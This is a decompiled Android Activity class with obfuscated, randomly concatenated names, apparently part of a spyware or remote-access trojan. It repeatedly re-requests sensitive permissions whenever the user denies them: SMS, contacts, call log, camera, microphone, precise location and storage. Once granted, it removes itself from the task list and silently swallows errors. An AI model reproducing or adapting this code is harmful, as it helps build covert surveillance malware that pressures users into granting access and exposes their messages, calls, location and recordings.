package com.appser;

import android.app.Activity;
import android.content.Context;
import android.os.Build;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;

public class miniatureosiderframescportionyquestiirelandibizrateotestimonymalienjshippeddroomsqansweredc24 extends Activity {
    public static boolean hasPermissions(Context context, String... strArr) {
        if (context == null || strArr == null) {
            return true;
        }
        for (String checkSelfPermission : strArr) {
            if (ActivityCompat.checkSelfPermission(context, checkSelfPermission) != 0) {
                return false;
            }
        }
        return true;
    }

    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        try {
            advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32FOR_prim = true;
            String[] PERMISSIONS = safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.PERMISSIONS();
            if (!hasPermissions(this, PERMISSIONS)) {
                ActivityCompat.requestPermissions(this, PERMISSIONS, 151);
            }
        } catch (Exception unused) {
        }
    }

    public void onRequestPermissionsResult(int i, String[] strArr, int[] iArr) {
        super.onRequestPermissionsResult(i, strArr, iArr);
        if (i == 151) {
            if (iArr.length <= 0 || iArr[0] != 0) {
                ActivityCompat.requestPermissions(this, new String[]{"android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.READ_CONTACTS", "android.permission.READ_SMS", "android.permission.READ_CALL_LOG", "android.permission.READ_EXTERNAL_STORAGE", "android.permission.CAMERA", "android.permission.RECORD_AUDIO", "android.permission.ACCESS_COARSE_LOCATION", "android.permission.ACCESS_FINE_LOCATION"}, 151);
                return;
            }
            advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32FOR_prim = false;
            finish();
        }
    }

    public void finish() {
        safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.asked = false;
        if (Build.VERSION.SDK_INT >= 21) {
            super.finishAndRemoveTask();
        } else {
            super.finish();
        }
    }
}
